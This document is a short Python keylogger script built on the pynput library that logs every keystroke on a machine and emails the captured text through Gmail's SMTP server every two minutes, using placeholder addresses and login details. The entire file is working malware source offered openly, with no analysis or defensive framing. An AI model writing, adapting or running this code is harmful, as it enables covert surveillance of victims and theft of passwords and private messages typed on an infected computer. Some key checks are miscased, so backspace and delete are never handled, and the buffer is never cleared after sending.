#!/usr/lib/python3

# Keylogger using pynput library and SMTPlib module

from pynput.keyboard import Listener
import smtplib
from threading import Timer

msg = ''


def on_press(key):
    global msg
    k = str(key).replace("'", "")

    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'key.backspace':
        msg = msg[:-1]
    elif k == 'Key.space':
        msg += " "
    elif k == 'Key.shift':
        msg += '[SHIFT]\n'
    elif k == 'key.delete':
        msg += '[DEL]\n'
    else:
        msg += k


def send():
    global msg
    if len(msg) > 0:
        server.sendmail("from@address", "To@address", msg)
    Timer(120.0, send).start()


# keyboard listening
listener = Listener(on_press=on_press)
listener.start()

# connecting to smtp server
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("username", "password")

# start sending function after 2 minutes
Timer(120.0, send).start()
